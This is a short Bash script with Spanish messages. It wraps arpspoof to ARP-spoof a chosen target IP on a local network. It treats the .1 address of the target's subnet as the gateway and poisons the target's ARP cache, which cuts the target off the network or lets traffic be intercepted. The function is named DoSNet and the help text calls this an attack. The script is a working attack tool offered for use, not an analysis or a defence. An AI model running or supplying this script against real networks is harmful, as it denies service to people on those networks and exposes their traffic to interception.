#!/bin/bash

# Variables globales
main_url="https://htbmachines.github.io/bundle.js"

# colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"
  exit 1
}

trap ctrl_c INT

function sudo(){
if [ $(id -u) != 0 ]; then
  echo "Ejecute como root"
  exit 1
fi
}

function checkTool(){
  if ! command -v "$1" &> /dev/null; then
    echo "${redColour}[!] Error: $1 no esta instalado. Instala $1 con sudo apt install dsniff y vuelve a intentarlo.${endColour}"
    exit 1
  fi
}

function helpPanel(){
  echo -e "\n${yellowColour}[+]${endColour} Uso:\n"
  echo -e "\t${purpleColour}i)${endColour} interface ${purpleColour}I)${endColour} IP : ${turquoiseColour}Poner interfaz de la red y IP del target para el ataque${endColour}"
  echo -e "\t${purpleColour}h)${endColour} : ${turquoiseColour}Panel de ayuda${endColour}"
}

function DoSNet(){
  interface=$1
  ip=$2

  calculateDoor=$(echo "$ip" | awk -F. 'BEGIN {OFS="."} {$NF=1; print $0}')

  arpspoof -i "$interface" -t "$ip" "$calculateDoor"
}


# Chivatos
declare -i ipIndicator=0
declare -i interfaceIndicator=0
 
while getopts "i:I:" arg; do
  case $arg in
    i)interface=$OPTARG; interfaceIndicator=1;;
    I)ip=$OPTARG; ipIndicator=1;;
  esac
done

sudo
checkTool "dsniff"

if [ $interfaceIndicator -eq 1 ] && [ $ipIndicator -eq 1 ]; then
  DoSNet $interface $ip
else
  helpPanel
fi
